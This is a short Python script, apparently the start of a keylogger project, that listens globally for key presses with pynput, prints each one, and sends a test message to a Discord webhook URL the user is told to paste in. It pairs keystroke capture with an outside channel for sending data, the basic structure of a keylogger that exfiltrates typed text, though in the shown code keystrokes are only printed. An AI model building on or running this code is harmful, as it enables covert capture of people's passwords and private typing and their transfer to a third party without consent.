import pynput
from pynput.keyboard import Key, Listener
from discord_webhook import DiscordWebhook

webhook_url = '#'     # Paste here your Webhook URL (instructions in README.md)

DiscordWebhook(url=webhook_url, content='Hello world!').execute()     # Send message using Webhook

def on_press(key):     # Executes on each key pressed
    print(key)

with Listener(on_press=on_press) as listener:
    listener.join()     # Start the listener